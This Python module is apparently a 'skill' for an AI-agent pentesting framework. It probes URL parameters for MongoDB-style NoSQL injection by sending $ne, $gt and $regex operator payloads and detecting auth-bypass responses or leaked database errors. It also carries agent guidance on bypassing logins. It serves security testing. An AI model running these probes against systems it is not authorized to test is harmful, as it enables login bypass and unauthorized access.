"""SkillNoSqli — MongoDB-style NoSQL injection probe.

Two-stage:
  1. Substitute the param value with operator-injection variants
     ({"$ne":null}, [$ne]=null, etc.). Compare response against baseline —
     a status/body change indicates the operator was honored.
  2. Look for NoSQL-specific error markers in the response (Mongo, Mongoose,
     CouchDB).

Severity:
  - critical : auth-bypass-shaped success (request that should have failed
               returned a different 200/3xx response, suggesting login bypass
               via $ne / $gt operators)
  - high     : NoSQL error marker leaked in the response (confirms NoSQL
               backend + leaked errors)
  - info     : nothing
"""
from __future__ import annotations
from typing import Optional
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl

import requests

from services.skills.base import Skill, SkillResult, register
from services.skills._payloads import NOSQLI_PAYLOADS, NOSQLI_ERROR_MARKERS
from services.skills._poc import capture_from_response


_HEADERS = {"User-Agent": "Mozilla/5.0 ZeekGlare-Arena-NoSQLi"}


def _swap_query(url: str, param: str, value: str) -> str:
    p = urlparse(url)
    qs = parse_qsl(p.query, keep_blank_values=True)
    new_qs = [(k, value if k == param else v) for k, v in qs]
    if not any(k == param for k, _ in qs):
        new_qs.append((param, value))
    return urlunparse((p.scheme, p.netloc, p.path, p.params, urlencode(new_qs), p.fragment))


@register
class SkillNoSqli(Skill):
    name        = "skill_nosqli"
    danger      = "active"
    description = (
        "Probe a URL+param for NoSQL injection (MongoDB-shaped). Substitutes "
        "the param with operator payloads ($ne / $gt / $regex), and tries "
        "URL-encoded operator variants (?param[$ne]=null). Compares against "
        "baseline. Critical if the operator-injected request yields auth-"
        "bypass behavior (success where baseline failed). Also reports NoSQL "
        "error markers when the backend leaks them."
    )
    guidance    = (
        "NoSQLi is most impactful on login endpoints — {\"$ne\":null} as the "
        "password makes the query 'where password is not null', matching all "
        "users. Try POST JSON bodies too: many APIs accept either form."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "url":   {"type": "string", "description": "URL to probe."},
            "param": {"type": "string", "description": "Param name (e.g. 'password', 'username')."},
            "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
            "json_body_template": {
                "type": "object",
                "description": "Optional JSON template for POST. The string '__VALUE__' is replaced with each payload.",
            },
        },
        "required": ["url", "param"],
    }

    @classmethod
    def applicable(cls, state) -> bool:
        c = state.asset_counts()
        return c.get("url", 0) > 0 or c.get("param", 0) > 0

    @classmethod
    def dedup_key(cls, args) -> Optional[tuple[str, str, str, str]]:
        return (args.get("url", ""), args.get("param", ""), "nosqli", "operator_inject")

    @classmethod
    def run(cls, args, state, agent_id) -> SkillResult:
        url    = (args.get("url") or "").strip()
        param  = (args.get("param") or "").strip()
        method = (args.get("method") or "GET").upper()
        tmpl   = args.get("json_body_template") or None
        if not url or not param:
            return SkillResult(ok=False, error="url and param required")
        if not state.in_scope(url):
            return SkillResult(ok=False, error=f"out of scope: {url}")

        # Baseline.
        try:
            if method == "POST" and tmpl:
                body = {**tmpl, param: "baseline-zg"}
                r0 = requests.post(url, json=body, headers=_HEADERS,
                                    timeout=10, allow_redirects=False, verify=False)
            else:
                r0 = requests.get(_swap_query(url, param, "baseline-zg"),
                                   headers=_HEADERS, timeout=10,
                                   allow_redirects=False, verify=False)
        except Exception as e:
            return SkillResult(ok=False, error=f"baseline failed: {type(e).__name__}: {e}")

        baseline = {"status": r0.status_code, "length": len(r0.content or b"")}
        bypass_hits, error_hits, all_probes = [], [], []

        for payload, kind in NOSQLI_PAYLOADS:
            try:
                if method == "POST" and tmpl:
                    # For POST: payload is operator object/string in JSON
                    inj_value = payload
                    # If looks like JSON object, parse it back into dict
                    if payload.startswith("{") and payload.endswith("}"):
                        import json as _json
                        try:
                            inj_value = _json.loads(payload)
                        except Exception:
                            pass
                    body = {**tmpl, param: inj_value}
                    rp = requests.post(url, json=body, headers=_HEADERS,
                                        timeout=10, allow_redirects=False, verify=False)
                else:
                    rp = requests.get(_swap_query(url, param, payload),
                                       headers=_HEADERS, timeout=10,
                                       allow_redirects=False, verify=False)
            except Exception as e:
                all_probes.append({"payload": payload, "error": str(e)})
                continue

            body = rp.text or ""
            body_lc = body.lower()
            err_match = [m for m in NOSQLI_ERROR_MARKERS if m in body_lc]
            len_delta = abs(len(rp.content or b"") - baseline["length"])
            status_delta = rp.status_code != baseline["status"]
            rec = {"payload": payload, "kind": kind,
                   "status": rp.status_code,
                   "length": len(rp.content or b""),
                   "len_delta": len_delta,
                   "status_delta": status_delta,
                   "error_markers": err_match,
                   "_response": rp}
            all_probes.append(rec)
            # Auth-bypass: response materially different AND came back 2xx where
            # baseline didn't (or vice versa)
            if kind == "auth_bypass" and 200 <= rp.status_code < 400 and (status_delta or len_delta > 100):
                bypass_hits.append(rec)
            if err_match:
                error_hits.append(rec)

        if bypass_hits:
            best = bypass_hits[0]
            poc = capture_from_response(
                best["_response"],
                caption=f"NoSQL operator injection — payload={best['payload']!r}, "
                        f"baseline {baseline['status']} ({baseline['length']}B) → "
                        f"{best['status']} ({best['length']}B)"
            )
            return SkillResult(
                ok=True,
                summary=f"NoSQLi auth-bypass shape: {len(bypass_hits)} payload(s) flipped response.",
                evidence=poc.format(),
                finding={
                    "vuln_type":   "nosqli",
                    "severity":    "critical",
                    "target":      url,
                    "location":    f"{url} param={param}",
                    "description": (
                        f"NoSQL operator injection on '{param}'. {len(bypass_hits)} payload(s) "
                        "produced auth-bypass-shaped responses (different status/length than "
                        "baseline with operator-form input). Common impact: login bypass via "
                        "$ne/$gt operators."
                    ),
                    "evidence":    poc.format(),
                },
                extras={"bypass_hits": [{k: v for k, v in h.items() if k != "_response"} for h in bypass_hits],
                        "baseline": baseline},
            )
        if error_hits:
            best = error_hits[0]
            poc = capture_from_response(
                best["_response"],
                caption=f"NoSQL backend confirmed via error leak — payload={best['payload']!r}"
            )
            return SkillResult(
                ok=True,
                summary=f"NoSQL error leak: {len(error_hits)} response(s) revealed Mongo/CouchDB markers.",
                evidence=poc.format(),
                finding={
                    "vuln_type":   "nosqli_error",
                    "severity":    "high",
                    "target":      url,
                    "location":    f"{url} param={param}",
                    "description": (
                        "NoSQL backend leaked error messages when special characters were "
                        "injected. Confirms the backend is NoSQL and reveals it's not "
                        "sanitizing input — full operator injection is likely."
                    ),
                    "evidence":    poc.format(),
                },
                extras={"error_markers_found": [r["error_markers"] for r in error_hits[:3]]},
            )

        return SkillResult(
            ok=True,
            summary=f"No NoSQLi signals across {len(all_probes)} payloads.",
            extras={"baseline": baseline, "probes_attempted": len(all_probes)},
        )
